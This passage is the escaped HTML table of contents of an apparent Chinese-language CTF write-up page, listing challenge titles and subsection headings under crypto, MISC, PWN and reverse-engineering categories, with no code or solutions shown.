class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-5\"><span class=\"toc-text\">解题</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#python%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">python脚本</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#simple-calculation\"><span class=\"toc-text\">simple calculation</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#childRSA\"><span class=\"toc-text\">childRSA</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%B7%B3%E8%B7%83%E7%9A%84%E6%8C%87%E5%B0%96\"><span class=\"toc-text\">跳跃的指尖</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-5\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-6\"><span class=\"toc-text\">解题</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Strange-code\"><span class=\"toc-text\">Strange code</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-6\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-5\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8A%A0%E5%AF%86%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">加密流程</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5\"><span class=\"toc-text\">生成公钥</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8A%A0%E5%AF%86\"><span class=\"toc-text\">加密</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E5%AF%86\"><span class=\"toc-text\">解密</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">解题脚本</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#funny-rsa\"><span class=\"toc-text\">funny rsa</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MISC\"><span class=\"toc-text\">MISC</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE\"><span class=\"toc-text\">一叶障目</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A3%AE%E8%A8%80%E5%A3%AE%E8%AF%AD\"><span class=\"toc-text\">壮言壮语</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%A7%98%E6%8A%80%C2%B7%E5%8F%8D%E5%A4%8D%E6%A8%AA%E8%B7%B3\"><span class=\"toc-text\">秘技·反复横跳</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9D%A5%E6%8B%BC%E5%9B%BE\"><span class=\"toc-text\">来拼图</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A3%9E%E7%BF%94%E7%9A%84%E5%88%98%E5%A3%AE\"><span class=\"toc-text\">飞翔的刘壮</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%90%89%E6%99%AE%E8%B5%9B%E7%9A%84%E6%AD%8C%E5%A7%AC\"><span class=\"toc-text\">吉普赛的歌姬</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PWN\"><span class=\"toc-text\">PWN</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%95%B0%E5%AD%A6%E5%92%8B%E6%A0%B7\"><span class=\"toc-text\">数学咋样?</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-7\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-6\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-7\"><span class=\"toc-text\">解题</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#liuzhuang-secret\"><span class=\"toc-text\">liuzhuang-secret</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-8\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-7\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-8\"><span class=\"toc-text\">解题</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%A1%AE%E8%AE%A4%E8%A6%86%E7%9B%96%E5%9C%B0%E5%9D%80\"><span class=\"toc-text\">确认覆盖地址</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%90%9C%E9%9B%86%E7%BB%84%E4%BB%B6\"><span class=\"toc-text\">搜集组件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9B%B4%E5%A4%8D%E6%9D%82%E7%9A%84%E8%A7%A3%E6%B3%95-%E6%9E%84%E9%80%A0ROP%E9%93%BE\"><span class=\"toc-text\">更复杂的解法: 构造ROP链</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#fmt\"><span class=\"toc-text\">fmt</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-9\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-8\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-9\"><span class=\"toc-text\">解题</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%952\"><span class=\"toc-text\">解法2</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#runcode\"><span class=\"toc-text\">runcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9D%9E%E6%9C%9F%E6%9C%9B%E8%A7%A3\"><span class=\"toc-text\">非期望解</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#baby-canary\"><span class=\"toc-text\">baby_canary</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-10\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-10\"><span class=\"toc-text\">解题</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pwn111\"><span class=\"toc-text\">pwn111</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-11\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-11\"><span class=\"toc-text\">解题</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%A4%9A%E6%AC%A1pop\"><span class=\"toc-text\">方法一: 多次pop</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C-3%E5%8F%82%E6%95%B0ROP\"><span class=\"toc-text\">方法二: 3参数ROP</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pwn222\"><span class=\"toc-text\">pwn222</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#RE\"><span class=\"toc-text\">RE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#No-RE-no-gain\"><span class=\"toc-text\">No RE no gain</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%88%91%E7%9C%9F%E7%9A%84%E4%B8%8D%E4%BC%9A%E5%86%99%E9%A9%B1%E5%8A%A8\"><span class=\"toc-text\">我真的不会写驱动</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#re00\"><span class=\"toc-text\">re00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#maze\"><span class=\"toc-text\">maze</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Hello-NET\"><span class=\"toc-text\">Hello .NET</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%98%E5%A3%AE%E7%9A%84BaseXX\"><span class=\"toc-text\">刘壮的BaseXX</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#WhatsApk\"><span class=\"toc-text\">WhatsApk</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#HelloAndroid\"><span class=\"toc-text\">HelloAndroid</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Easy-virus\"><span class=\"toc-text\">Easy_virus</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-9\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-12\"><span class=\"toc-text\">解题</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#un-snake\"><span class=\"toc-text\">un_snake</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%AD%A3%E5%90%91%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">正向流程</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%90%91%E5%88%86%E6%9E%90\"><span class=\"toc-text\">反向分析</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#pre\"><span class=\"toc-text\">pre()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#enc\"><span class=\"toc-text\">enc()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC-1\"><span class=\"toc-text\">解题脚本</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#plain-snake\"><span class=\"toc-text\">plain_snake</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E7%A4%BA-10\"><span class=\"toc-text\">提示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE\"><span class=\"toc-text\">题目</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E5%AD%90%EF%BC%88%E6%BA%90%E8%87%AA%E6%9C%AC%E9%A2%98%EF%BC%89\"><span class=\"toc-text\">例子（源自本题）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%BF%98%E5%8E%9F%E4%BB%A3%E7%A0%81\"><span class=\"toc-text\">还原代码</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC-2\"><span class=\"toc-text\">解题脚本</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#baby-re\"><span class=\"toc-text\">baby_re</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E6%A0%87%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">目标内容</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%AD%A3%E5%90%91%E6%B5%81%E7%A8%8B-1\"><span class=\"toc-text\">正向流程</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#step1%EF%BC%9Asub-42F057\"><span class=\"toc-text\">step1：sub_42F057()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#step2%EF%BC%9Asub-432B20\"><span class=\"toc-text\">step2：sub_432B20()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#step3%EF%BC%9Asub-4329B0\"><span class=\"toc-text\">step3：sub_4329B0()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98-13\"><span class=\"toc-text\">解题</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#step-3%EF%BC%9A%E6%94%B9%E5%86%99sub-4329B0\"><span class=\"toc-text\">step-3：改写sub_4329B0()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#step-2%EF%BC%9A%E8%8E%B7%E5%8F%96sub-432B20-%E7%BB%93%E6%9E%9C\"><span class=\"toc-text\">step-2：获取sub_432B20()结果</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC-3\"><span class=\"toc-text\">解题脚本</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#golang11\"><span class=\"toc-text\">golang11</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-12\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#go%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91\"><span class=\"toc-text\">go语言逆向</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%BB%E5%87%BD%E6%95%B0%E7%8C%9C%E7%9A%84%E7%BB%93%E6%9E%9C\"><span class=\"toc-text\">主函数猜的结果</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">反函数</span></a></li></ol></li></ol></li></ol>"}